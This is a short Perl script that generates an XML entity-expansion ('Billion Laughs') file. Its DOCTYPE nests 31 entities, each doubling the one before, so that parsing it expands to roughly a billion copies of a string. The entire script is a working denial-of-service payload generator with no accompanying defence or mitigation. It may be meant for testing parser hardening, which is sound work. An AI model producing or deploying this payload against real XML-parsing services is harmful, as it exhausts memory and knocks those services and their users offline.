#!/usr/bin/perl

# Simulate Billion Laughs attack, fill memory with recursive XML references of "Ha"
$entities = 30;
$i = 1;

open OUT, ">BillionLaughs.xml" or die "cannot open BillionLaughs.xml";

print OUT "<?xml version=\"1.0\"?>\n";
print OUT "<!DOCTYPE root [ \n";
print OUT "<!ELEMENT root (#PCDATA)>\n";
print OUT "  <!ENTITY ha0 \"Ha !\">\n";
for( $i=1; $i <= $entities; $i++ ){
    printf OUT " <!ENTITY ha%s \"&ha%s;&ha%s;\" >\n", $i, $i-1, $i-1;
}
print OUT "]>\n";
printf OUT "<root>&ha%s;</root>\n", $entities;

close OUT;